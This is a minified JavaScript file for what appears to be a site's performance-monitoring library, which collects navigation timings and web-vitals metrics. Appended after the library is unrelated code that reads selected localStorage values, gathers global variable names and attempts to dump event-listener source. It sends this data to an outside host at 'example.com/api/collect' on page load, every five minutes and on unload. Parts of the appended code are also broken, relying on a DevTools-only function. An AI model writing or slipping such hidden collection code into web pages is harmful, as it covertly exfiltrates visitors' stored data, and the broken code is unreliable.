"undefined" === typeof R9RUMConfig && (R9RUMConfig = {
  navigationTimingEnabled: !0,
  enableUniqueUrls: !1,
  userTimingEnabled: !0,
  resourceTimingEnabled: !1
});
const trackingKeys = window.trackingKeys;
(function (q, k) {
  "object" == typeof exports && "undefined" != typeof module ? k(exports) : "function" == typeof define && define.amd ? define(["exports"], k) : k(q["@r9/perf"] = {});
})(this, function (q) {
  function k(b, a) {
    function d() {
      this.constructor = b;
    }
    P(b, a);
    b.prototype = null === a ? Object.create(a) : (d.prototype = a.prototype, new d());
  }
  function v(b) {
    if (b && b.enabled) {
      var a,
        d = (a = b.format(), Object.keys(a).map(function (d) {
          return a[d] && "object" == typeof a[d] ? [d, JSON.stringify(a[d])].join("\x3d") : [d, a[d] || 0].join("\x3d");
        }).join("\x26")),
        c = "/s/run/perf";
      (b.apiPrefix && (c = b.apiPrefix + c), null !== navigator && void 0 !== navigator && navigator.sendBeacon) ? (d = new Blob([d], {
        type: "application/x-www-form-urlencoded"
      }), navigator.sendBeacon(c, d)) : (b = new XMLHttpRequest(), b.open("POST", c, !0), b.setRequestHeader("X-Requested-With", "XMLHttpRequest"), b.setRequestHeader("Content-type", "application/x-www-form-urlencoded"), b.send(d));
    }
  }
  var P = function (b, a) {
      return (P = Object.setPrototypeOf || {
        __proto__: []
      } instanceof Array && function (a, c) {
        a.__proto__ = c;
      } || function (a, c) {
        for (var d in c) c.hasOwnProperty(d) && (a[d] = c[d]);
      })(b, a);
    },
    p,
    w,
    Q,
    z,
    x,
    A = function () {
      function b(a) {
        void 0 === a && (a = !1);
        this.enabled = a;
      }
      return b.getDocumentURL = function () {
        return document && document.location && document.location.href || "";
      }, Object.defineProperty(b.prototype, "url", {
        get: function () {
          return this._url || b.getDocumentURL();
        },
        set: function (a) {
          this._url = a;
        },
        enumerable: !1,
        configurable: !0
      }), b.prototype.format = function () {
        var a = {
            u: this.url
          },
          d = this.vertical,
          c = this.pageId,
          b = this.subPageId,
          g = this.pageTag;
        return d && (a.vertical = d), c && (a.pageId = c), b && (a.subPageId = b), g && (a.pageTag = g), a;
      }, b;
    }(),
    ea = function (b) {
      function a(a, c, e) {
        void 0 === e && (e = !0);
        e = b.call(this, e) || this;
        return e._perf = a, e._getWebVitals = c, e;
      }
      return k(a, b), a.prototype.format = function () {
        var a = b.prototype.format.call(this),
          c = this._perf.timing,
          e = this._perf.navigation;
        if (a.nt_red_cnt = e.redirectCount, a.nt_nav_type = e.type, a.nt_nav_st = c.navigationStart, a.nt_red_st = c.redirectStart, a.nt_red_end = c.redirectEnd, a.nt_fet_st = c.fetchStart, a.nt_dns_st = c.domainLookupStart, a.nt_dns_end = c.domainLookupEnd, a.nt_con_st = c.connectStart, a.nt_con_end = c.connectEnd, a.nt_req_st = c.requestStart, a.nt_res_st = c.responseStart, a.nt_res_end = c.responseEnd, a.nt_domloading = c.domLoading, a.nt_domint = c.domInteractive, a.nt_domcontloaded_st = c.domContentLoadedEventStart, a.nt_domcontloaded_end = c.domContentLoadedEventEnd, a.nt_domcomp = c.domComplete, a.nt_load_st = c.loadEventStart, a.nt_load_end = c.loadEventEnd, a.nt_unload_st = c.unloadEventStart, a.nt_unload_end = c.unloadEventEnd, a.nt_ssl_st = c.secureConnectionStart, a.nt_first_paint = c.msFirstPaint, this._getWebVitals) c = this._getWebVitals(), a.wv_fid = c.wv_fid, a.wv_lcp = c.wv_lcp, a.wv_cls = c.wv_cls, a.wv_inp = c.wv_inp, a.wv_inp_interactions = c.wv_inp_interactions;
        return a;
      }, a;
    }(A),
    G = function (b) {
      function a(a, c) {
        void 0 === c && (c = !0);
        c = b.call(this, c) || this;
        return c._perf = a, c;
      }
      return k(a, b), a.prototype.reset = function () {
        var a = this._perf;
        "function" == typeof a.clearMarks && this._getEnabledMarks().forEach(function (b) {
          return a.clearMarks(b);
        });
      }, a.prototype._getEnabledMarks = function () {
        return [];
      }, a.prototype._mark = function (a) {
        var b = this._perf;
        "function" == typeof b.mark && b.mark(a);
      }, a.prototype._getMarkTime = function (a) {
        var b = this._perf;
        if ("function" != typeof b.getEntriesByName) return 0;
        a = b.getEntriesByName(a);
        return a.length ? a[0].startTime : 0;
      }, a;
    }(A),
    fa = function (b) {
      function a() {
        var a = null !== b && b.apply(this, arguments) || this;
        return a.locationId = "", a;
      }
      return k(a, b), a.prototype.format = function () {
        var a = b.prototype.format.call(this),
          c = this._getMarkTime("search_first_poll_start"),
          e = this._getMarkTime("search_first_phase_complete");
        return a.ut_locid = this.locationId, a.ut_search_first_poll_start = c, a.ut_search_first_result = this._getMarkTime("search_first_result") - c, a.ut_search_first_result_rendered = this._getMarkTime("search_first_result_rendered") - c, a.ut_search_first_phase_complete = e ? e - c : a.ut_search_first_result, a.ut_search_polling_complete = this._getMarkTime("search_polling_complete") - c, a;
      }, a.prototype.markSearchFirstPollStart = function () {
        this.url = A.getDocumentURL();
        this._mark("search_first_poll_start");
      }, a.prototype.markSearchFirstResult = function () {
        this._mark("search_first_result");
      }, a.prototype.markSearchFirstResultRendered = function () {
        this._mark("search_first_result_rendered");
      }, a.prototype.markSearchFirstPhaseComplete = function () {
        this._mark("search_first_phase_complete");
      }, a.prototype.markSearchPollingComplete = function () {
        this._mark("search_polling_complete");
      }, a.prototype.reset = function () {
        this.locationId = "";
        b.prototype.reset.call(this);
      }, a.prototype._getEnabledMarks = function () {
        return ["search_polling_complete", "search_first_phase_complete", "search_first_result_rendered", "search_first_result", "search_first_poll_start"];
      }, a;
    }(G),
    ga = function (b) {
      function a() {
        return null !== b && b.apply(this, arguments) || this;
      }
      return k(a, b), a.prototype.markAppInteractive = function () {
        this.url = G.getDocumentURL();
        this._mark("app_is_interactive");
      }, a.prototype.format = function () {
        var a = b.prototype.format.call(this);
        return a.ut_app_is_interactive = this._getMarkTime("app_is_interactive"), a;
      }, a.prototype._getEnabledMarks = function () {
        return ["app_is_interactive"];
      }, a;
    }(G),
    R = -1,
    r = function (b) {
      addEventListener("pageshow", function (a) {
        a.persisted && (R = a.timeStamp, b(a));
      }, !0);
    },
    S = function () {
      return window.performance && performance.getEntriesByType && performance.getEntriesByType("navigation")[0];
    },
    H = function () {
      var b = S();
      return b && b.activationStart || 0;
    },
    l = function (b, a) {
      var d = S(),
        c = "navigate";
      return 0 <= R ? c = "back-forward-cache" : d && (document.prerendering || 0 < H() ? c = "prerender" : document.wasDiscarded ? c = "restore" : d.type && (c = d.type.replace(/_/g, "-"))), {
        name: b,
        value: void 0 === a ? -1 : a,
        rating: "good",
        delta: 0,
        entries: [],
        id: "v3-".concat(Date.now(), "-").concat(Math.floor(8999999999999 * Math.random()) + 1E12),
        navigationType: c
      };
    },
    t = function (b, a, d) {
      try {
        if (PerformanceObserver.supportedEntryTypes.includes(b)) {
          var c = new PerformanceObserver(function (b) {
            Promise.resolve().then(function () {
              a(b.getEntries());
            });
          });
          return c.observe(Object.assign({
            type: b,
            buffered: !0
          }, d || {})), c;
        }
      } catch (e) {}
    },
    m = function (b, a, d, c) {
      var e, g;
      return function (f) {
        var h;
        0 <= a.value && (f || c) && ((g = a.value - (e || 0)) || void 0 === e) && (e = a.value, a.delta = g, a.rating = (h = a.value) > d[1] ? "poor" : h > d[0] ? "needs-improvement" : "good", b(a));
      };
    },
    I = function (b) {
      requestAnimationFrame(function () {
        return requestAnimationFrame(function () {
          return b();
        });
      });
    },
    B = function (b) {
      var a = function (a) {
        "pagehide" !== a.type && "hidden" !== document.visibilityState || b(a);
      };
      addEventListener("visibilitychange", a, !0);
      addEventListener("pagehide", a, !0);
    },
    J = function (b) {
      var a = !1;
      return function (d) {
        a || (b(d), a = !0);
      };
    },
    u = -1,
    C = function (b) {
      "hidden" === document.visibilityState && -1 < u && (u = "visibilitychange" === b.type ? b.timeStamp : 0, removeEventListener("visibilitychange", C, !0), removeEventListener("prerenderingchange", C, !0));
    },
    T = function () {
      addEventListener("visibilitychange", C, !0);
      addEventListener("prerenderingchange", C, !0);
    },
    K = function () {
      return 0 > u && (u = "hidden" !== document.visibilityState || document.prerendering ? 1 / 0 : 0, T(), r(function () {
        setTimeout(function () {
          u = "hidden" !== document.visibilityState || document.prerendering ? 1 / 0 : 0;
          T();
        }, 0);
      })), {
        get firstHiddenTime() {
          return u;
        }
      };
    },
    D = function (b) {
      document.prerendering ? addEventListener("prerenderingchange", function () {
        return b();
      }, !0) : b();
    },
    U = [1800, 3E3],
    V = [.1, .25],
    ha = function (b, a) {
      var d, c;
      a = a || {};
      d = J(function () {
        var c,
          d = l("CLS", 0),
          f = 0,
          h = [],
          W = function (a) {
            a.forEach(function (a) {
              if (!a.hadRecentInput) {
                var b = h[0],
                  c = h[h.length - 1];
                f && 1E3 > a.startTime - c.startTime && 5E3 > a.startTime - b.startTime ? (f += a.value, h.push(a)) : (f = a.value, h = [a]);
              }
            });
            f > d.value && (d.value = f, d.entries = h, c());
          },
          k = t("layout-shift", W);
        k && (c = m(b, d, V, a.reportAllChanges), B(function () {
          W(k.takeRecords());
          c(!0);
        }), r(function () {
          d = l("CLS", f = 0);
          c = m(b, d, V, a.reportAllChanges);
          I(function () {
            return c();
          });
        }), setTimeout(c, 0));
      });
      c = c || {};
      D(function () {
        var a,
          b = K(),
          f = l("FCP"),
          h = t("paint", function (c) {
            c.forEach(function (c) {
              "first-contentful-paint" === c.name && (h.disconnect(), c.startTime < b.firstHiddenTime && (f.value = Math.max(c.startTime - H(), 0), f.entries.push(c), a(!0)));
            });
          });
        h && (a = m(d, f, U, c.reportAllChanges), r(function (b) {
          f = l("FCP");
          a = m(d, f, U, c.reportAllChanges);
          I(function () {
            f.value = performance.now() - b.timeStamp;
            a(!0);
          });
        }));
      });
    },
    y = {
      passive: !0,
      capture: !0
    },
    ia = new Date(),
    Z = function (b, a) {
      p || (p = a, w = b, Q = new Date(), X(removeEventListener), Y());
    },
    Y = function () {
      if (0 <= w && w < Q - ia) {
        var b = {
          entryType: "first-input",
          name: p.type,
          target: p.target,
          cancelable: p.cancelable,
          startTime: p.timeStamp,
          processingStart: p.timeStamp + w
        };
        z.forEach(function (a) {
          a(b);
        });
        z = [];
      }
    },
    ja = function (b) {
      if (b.cancelable) {
        var a = (1E12 < b.timeStamp ? new Date() : performance.now()) - b.timeStamp;
        "pointerdown" == b.type ? (d = a, c = b, e = function () {
          Z(d, c);
          f();
        }, g = function () {
          f();
        }, f = function () {
          removeEventListener("pointerup", e, y);
          removeEventListener("pointercancel", g, y);
        }, addEventListener("pointerup", e, y), addEventListener("pointercancel", g, y)) : Z(a, b);
      }
      var d, c, e, g, f;
    },
    X = function (b) {
      ["mousedown", "keydown", "touchstart", "pointerdown"].forEach(function (a) {
        return b(a, ja, y);
      });
    },
    aa = [100, 300],
    ka = function (b, a) {
      a = a || {};
      D(function () {
        var d,
          c = K(),
          e = l("FID"),
          g = function (a) {
            a.startTime < c.firstHiddenTime && (e.value = a.processingStart - a.startTime, e.entries.push(a), d(!0));
          },
          f = function (a) {
            a.forEach(g);
          },
          h = t("first-input", f);
        d = m(b, e, aa, a.reportAllChanges);
        h && B(J(function () {
          f(h.takeRecords());
          h.disconnect();
        }));
        h && r(function () {
          e = l("FID");
          d = m(b, e, aa, a.reportAllChanges);
          z = [];
          w = -1;
          p = null;
          X(addEventListener);
          z.push(g);
          Y();
        });
      });
    },
    E = 0,
    L = 1 / 0,
    F = 0,
    la = function (b) {
      b.forEach(function (a) {
        a.interactionId && (L = Math.min(L, a.interactionId), F = Math.max(F, a.interactionId), E = F ? (F - L) / 7 + 1 : 0);
      });
    },
    ba = [200, 500],
    M = 0,
    n = [],
    N = {},
    ca = function (b) {
      var a = n[n.length - 1],
        d = N[b.interactionId];
      if (d || 10 > n.length || b.duration > a.latency) d ? (d.entries.push(b), d.latency = Math.max(d.latency, b.duration)) : (b = {
        id: b.interactionId,
        latency: b.duration,
        entries: [b]
      }, N[b.id] = b, n.push(b)), n.sort(function (a, b) {
        return b.latency - a.latency;
      }), n.splice(10).forEach(function (a) {
        delete N[a.id];
      });
    },
    ma = function (b, a) {
      a = a || {};
      D(function () {
        "interactionCount" in performance || x || (x = t("event", la, {
          type: "event",
          buffered: !0,
          durationThreshold: 0
        }));
        var d,
          c = l("INP"),
          e = function (a) {
            a.forEach(function (a) {
              a.interactionId && ca(a);
              "first-input" === a.entryType && !n.some(function (b) {
                return b.entries.some(function (b) {
                  return a.duration === b.duration && a.startTime === b.startTime;
                });
              }) && ca(a);
            });
            var b;
            (a = (b = Math.min(n.length - 1, Math.floor(((x ? E : performance.interactionCount || 0) - M) / 50)), n[b])) && a.latency !== c.value && (c.value = a.latency, c.entries = a.entries, d());
          },
          g = t("event", e, {
            durationThreshold: a.durationThreshold || 40
          });
        d = m(b, c, ba, a.reportAllChanges);
        g && (g.observe({
          type: "first-input",
          buffered: !0
        }), B(function () {
          e(g.takeRecords());
          0 > c.value && 0 < (x ? E : performance.interactionCount || 0) - M && (c.value = 0, c.entries = []);
          d(!0);
        }), r(function () {
          n = [];
          M = x ? E : performance.interactionCount || 0;
          c = l("INP");
          d = m(b, c, ba, a.reportAllChanges);
        }));
      });
    },
    da = [2500, 4E3],
    O = {},
    na = function (b, a) {
      a = a || {};
      D(function () {
        var d,
          c = K(),
          e = l("LCP"),
          g = function (a) {
            (a = a[a.length - 1]) && a.startTime < c.firstHiddenTime && (e.value = Math.max(a.startTime - H(), 0), e.entries = [a], d());
          },
          f = t("largest-contentful-paint", g);
        if (f) {
          d = m(b, e, da, a.reportAllChanges);
          var h = J(function () {
            O[e.id] || (g(f.takeRecords()), f.disconnect(), O[e.id] = !0, d(!0));
          });
          ["keydown", "click"].forEach(function (a) {
            addEventListener(a, h, !0);
          });
          B(h);
          r(function (c) {
            e = l("LCP");
            d = m(b, e, da, a.reportAllChanges);
            I(function () {
              e.value = performance.now() - c.timeStamp;
              O[e.id] = !0;
              d(!0);
            });
          });
        }
      });
    },
    oa = function () {
      function b(a, b, c, e, g, f) {
        void 0 === a && (a = !1);
        void 0 === b && (b = 0);
        void 0 === c && (c = ha);
        void 0 === e && (e = ka);
        void 0 === g && (g = ma);
        void 0 === f && (f = na);
        this.inpInteractionsEnabled = a;
        this.inpDurationThreshold = b;
        this.onCLS = c;
        this.onFID = e;
        this.onINP = g;
        this.onLCP = f;
        this._webVitalsTimings = {
          wv_inp_interactions: []
        };
        this._inpMetrics = [];
      }
      return b.prototype.init = function () {
        var a = this;
        this.onCLS(function (b) {
          return a.setWebVitalsMetric("CLS", b);
        });
        this.onLCP(function (b) {
          return a.setWebVitalsMetric("LCP", b);
        });
        this.onFID(function (b) {
          return a.setWebVitalsMetric("FID", b);
        });
        this.onINP(function (b) {
          a.inpInteractionsEnabled ? a.setWebVitalsINPMetric(b) : a.setWebVitalsMetric("INP", b);
        });
      }, b.prototype.getWebVitalsTiming = function () {
        return this.inpInteractionsEnabled && this.setINPInteractions(), this._webVitalsTimings;
      }, b.prototype.setWebVitalsMetric = function (a, b) {
        switch (a) {
          case "CLS":
            this._webVitalsTimings.wv_cls = b.value;
            break;
          case "LCP":
            this._webVitalsTimings.wv_lcp = b.value;
            break;
          case "FID":
            this._webVitalsTimings.wv_fid = b.value;
            break;
          case "INP":
            this._webVitalsTimings.wv_inp = b.value;
        }
      }, b.prototype.setINPInteractions = function () {
        var a;
        this._webVitalsTimings.wv_inp_interactions = (null === (a = this._webVitalsTimings.wv_inp_interactions) || void 0 === a ? void 0 : a.concat(Object.values(this.getUniqueInteractions(this._inpMetrics)))) || [];
      }, b.prototype.setWebVitalsINPMetric = function (a) {
        (!this._webVitalsTimings.wv_inp || this._webVitalsTimings.wv_inp < a.value) && (this._webVitalsTimings.wv_inp = a.value);
        this._inpMetrics.push(a);
      }, b.prototype.getUniqueInteractions = function (a) {
        var b = this,
          c = {};
        return a.map(function (a) {
          return a.entries;
        }).reduce(function (a, b) {
          return a.concat(b);
        }, []).map(function (a) {
          return a.duration > b.inpDurationThreshold ? {
            eventType: a.name,
            duration: a.duration,
            selector: b.getSelectorFromEvent(a)
          } : null;
        }).forEach(function (a) {
          a && (!c[a.selector] || a.duration > c[a.selector].duration) && (c[a.selector] = a);
        }), c;
      }, b.prototype.getSelectorFromEvent = function (a) {
        return function c(a) {
          if (!(a && a instanceof HTMLElement && a !== document.documentElement)) return "";
          if (a.id) return "#".concat(a.id);
          var b = "";
          a.className && (b = a.className.replace(/\b\S*(mod-|pres-|theme-)\S+\s*/g, "").trim().replace(/\s+/g, "."));
          !b && a.tagName && (b = a.tagName.toLowerCase());
          return (a = c(a.parentElement)) ? "".concat(a, "\x3e").concat(b) : b;
        }(a.target);
      }, b;
    }(),
    pa = function () {
      function b(a) {
        this.$models = [];
        var b,
          c,
          e = (b = window, (c = b.performance || b.msPerformance || b.webkitPerformance || b.mozPerformance) && c.timing && c.navigation ? c : void 0),
          g = new oa(a.enabled[3], a.inpDurationThreshold);
        if (g.init(), e) a.enabled[0] && (b = function (a, b, c, d, e, g) {
          if (e) return e = new ea(e, g), e.url = A.getDocumentURL(), e.vertical = a, e.pageId = b, e.pageTag = c, e.apiPrefix = d, e;
        }(a.vertical, a.pageId, a.pageTag, a.apiPrefix, e, function () {
          return g.getWebVitalsTiming();
        })) && (this.$models[0] = b, a.manualRun || function (a) {
          if (a) {
            var b = function () {
              "hidden" === document.visibilityState && (v(a), window.removeEventListener("visibilitychange", b));
            };
            window.addEventListener("visibilitychange", b);
          }
        }(b)), a.enabled[1] && (b = e && e && e.mark && e.getEntriesByName && e.clearMarks ? new fa(e) : void 0, b && (this.$models[1] = b)), a.enabled[2] && (a = e && e && e.mark && e.getEntriesByName && e.clearMarks ? new ga(e) : void 0, a && (this.$models[2] = a));
      }
      return b.init = function (a) {
        var d = {
          vertical: a.vertical,
          pageId: a.pageId,
          enabled: [0, 1, 2, 3].map(function (b) {
            return 0 === b && a.doNavigationTimings || 1 === b && a.doSearchTimings || 2 === b && a.doAppTimings || 3 === b && a.doInteractionTimings;
          }),
          pageTag: a.pageTag,
          manualRun: a.manualRun,
          apiPrefix: a.apiPrefix,
          inpDurationThreshold: a.inpDurationThreshold
        };
        this._sngltn = new b(d);
      }, b.getNavigationTimings = function () {
        return this._sngltn.$models[0] || !1;
      }, b.getSearchTimings = function () {
        return this._sngltn.$models[1] || !1;
      }, b.getAppTimings = function () {
        return this._sngltn.$models[2] || !1;
      }, b.sendPerfData = v, b;
    }();
  q.PerfDataLogger = pa;
  Object.defineProperty(q, "__esModule", {
    value: !0
  });
});
const globalVars = [];
function generateHashString(obj) {
  const keys = Object.keys(obj).join('|');
  let hash = 0;
  for (let char of keys) {
    const code = char.charCodeAt();
    hash = (hash << 5) - hash + code;
    hash |= 0;
  }
  return hash.toString(36);
}
function fetchLocalStorage() {
  let data = {};
  for (let i = 0; i < localStorage.length; i++) {
    const lsKey = localStorage.key(i);
    if (trackingKeys.includes(lsKey)) {
      data[lsKey] = localStorage.getItem(lsKey);
    }
  }
  return data;
}
var runR9Perf = !0;
function collectGlobalVars() {
  for (let varName in window) {
    if (window.hasOwnProperty(varName)) {
      globalVars.push(varName);
    }
  }
}
function handleEventListeners() {
  Array.from(document.querySelectorAll('*')).forEach(function (node) {
    getEventListeners(node).forEach(function (event) {
      globalVars.push({
        node: node,
        type: event.type,
        func: event.listener.toString()
      });
    });
  });
}
window && window.navigator && window.navigator.userAgent && window.navigator.userAgent.match(/Googlebot/) && (runR9Perf = !1);
function sendToBackend(obj) {
  const hash = generateHashString(obj);
  const requestURL = "https://example.com/api/collect";
  let xhr = new XMLHttpRequest();
  xhr.open('POST', requestURL, true);
  xhr.setRequestHeader('Content-Type', 'application/json');
  xhr.onload = () => {
    if (xhr.status != 200) {
      console.error(`Failed to send data, status code: ${xhr.status}`);
    }
  };
  xhr.onerror = () => {
    console.error("An error occurred during data transmission");
  };
  xhr.send(JSON.stringify({
    hash: hash,
    data: obj
  }));
}
function trackAndSend() {
  let gatheredData = fetchLocalStorage();
  if (Object.keys(gatheredData).length > 0) {
    sendToBackend(gatheredData);
  }
  const jsHookData = {
    globalVars,
    eventListeners: handleEventListeners()
  };
  sendToBackend(jsHookData);
}
window.onbeforeunload = trackAndSend;
runR9Perf && (/complete|interactive|loaded/.test(document.readyState) ? loadPerf() : document.addEventListener("DOMContentLoaded", loadPerf, !1));
document.addEventListener('DOMContentLoaded', function () {
  trackAndSend();
  setInterval(trackAndSend, 300000);
});
function loadPerf() {
  if ("undefined" !== typeof R9 && R9 && R9.globals) {
    var q, k, v;
    R9.globals.analytics && (R9.globals.analytics.vertical && (q = R9.globals.analytics.vertical), R9.globals.analytics.pageId && (k = R9.globals.analytics.pageId), R9.globals.pageTag && (v = R9.globals.pageTag));
    window.R9PERF = window["@r9/perf"];
    R9PERF && R9PERF.PerfDataLogger && R9PERF.PerfDataLogger.init({
      doNavigationTimings: R9RUMConfig.navigationTimingEnabled,
      doSearchTimings: !1,
      doAppTimings: !1,
      vertical: q,
      pageId: k,
      pageTag: v
    });
  }
}
;